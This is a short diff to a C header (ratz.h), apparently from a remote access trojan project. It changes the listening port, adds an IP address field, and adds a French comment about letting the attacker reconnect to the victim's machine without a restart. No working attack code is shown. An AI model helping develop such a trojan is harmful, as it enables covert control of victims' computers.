@@ -19,8 +19,10 @@
 #ifndef RATZ_H
 #define RATZ_H
 
+// Faire en sorte que lorsque l'attaquant se deconnecte, il puisse se reconnecter sans avoir a redemarrer l'hote (la victime)
+
 # define LOCALHOST	"127.0.0.1"
-# define PORT		8085
+# define PORT		8080
 
 # define _DEFAULT_SOURCE
 # define DEBUG_SIZE_MAX	1024
@@ -40,6 +42,7 @@ typedef struct sockaddr		s_sockaddr;
 
 typedef struct ratz
 {
+	char*			addr;		// IP address
 	int				raw_port;	// raw port (int BigEndian)
 	int				server;		// server fd
 	s_sockaddr_in	addri;		// socket address info
